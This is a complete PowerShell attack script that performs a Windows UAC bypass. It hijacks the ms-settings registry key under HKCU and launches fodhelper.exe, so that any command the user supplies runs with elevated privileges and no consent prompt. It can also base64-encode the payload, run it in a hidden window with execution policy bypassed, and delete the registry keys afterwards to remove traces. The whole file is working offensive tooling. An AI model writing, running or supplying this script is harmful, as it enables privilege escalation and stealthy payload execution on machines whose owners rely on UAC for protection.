#!/usr/bin/env pwsh
# Fodhelper-Bypass.ps1
# UAC bypass using fodhelper.exe registry hijack
# Usage: .\fodhelper-bypass.ps1 -Command "<your command>" -Cleanup

param(
    [Parameter(Mandatory=$true)]
    [string]$Command,
    
    [switch]$Cleanup,
    
    [switch]$Encode,
    
    [string]$PayloadPath
)

$RegistryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

function Test-AdminGroup {
    $adminCheck = net localgroup administrators 2>$null | Select-String "\B$($env:USERNAME)\B"
    return $adminCheck -ne $null
}

function Test-UACEnabled {
    $uac = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction SilentlyContinue
    return $uac -and $uac.EnableLUA -eq 1
}

function Test-64BitShell {
    return [Environment]::Is64BitProcess
}

Write-Host "=== Fodhelper UAC Bypass ===" -ForegroundColor Cyan

# Pre-flight checks
Write-Host "Checking prerequisites..." -ForegroundColor Yellow

if (-not (Test-AdminGroup)) {
    Write-Host "ERROR: User is not in Administrators group" -ForegroundColor Red
    Write-Host "UAC bypass requires Administrators group membership" -ForegroundColor Red
    exit 1
}
Write-Host "[+] User is in Administrators group" -ForegroundColor Green

if (-not (Test-UACEnabled)) {
    Write-Host "WARNING: UAC appears to be disabled" -ForegroundColor Yellow
    Write-Host "Consider using Start-Process -Verb runAs instead" -ForegroundColor Yellow
}

$shell64 = Test-64BitShell
Write-Host "[+] Running in $([Environment]::Is64BitProcess ? '64-bit' : '32-bit') shell" -ForegroundColor $(if ($shell64) { "Green" } else { "Yellow" })

# Prepare command
$finalCommand = $Command
if ($Encode) {
    $finalCommand = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Command))
    $finalCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e $finalCommand"
    Write-Host "[+] Command encoded to base64" -ForegroundColor Green
}

if (-not $shell64) {
    # Spawn 64-bit PowerShell for stability
    $finalCommand = "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell -nop -w hidden -c '$finalCommand'"
    Write-Host "[+] Using sysnative path for 64-bit PowerShell" -ForegroundColor Yellow
}

Write-Host "`nPayload: $finalCommand" -ForegroundColor White

# Create registry keys
Write-Host "`n[*] Creating registry keys..." -ForegroundColor Yellow
try {
    New-Item -Path $RegistryPath -Force | Out-Null
    New-ItemProperty -Path $RegistryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegistryPath -Name "(default)" -Value $finalCommand -Force
    Write-Host "[+] Registry keys created" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Failed to create registry keys: $_" -ForegroundColor Red
    exit 1
}

# Trigger bypass
Write-Host "`n[*] Triggering fodhelper.exe..." -ForegroundColor Yellow
Write-Host "[!] Your payload should execute with elevated privileges" -ForegroundColor Cyan

try {
    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Write-Host "[+] fodhelper.exe executed" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Failed to execute fodhelper.exe: $_" -ForegroundColor Red
}

# Cleanup
if ($Cleanup) {
    Write-Host "`n[*] Cleaning up registry keys..." -ForegroundColor Yellow
    try {
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Registry keys removed" -ForegroundColor Green
    } catch {
        Write-Host "WARNING: Could not clean up registry keys: $_" -ForegroundColor Yellow
    }
}

Write-Host "`n=== Bypass Complete ===" -ForegroundColor Cyan
Write-Host "Check if your payload executed with elevated privileges" -ForegroundColor White
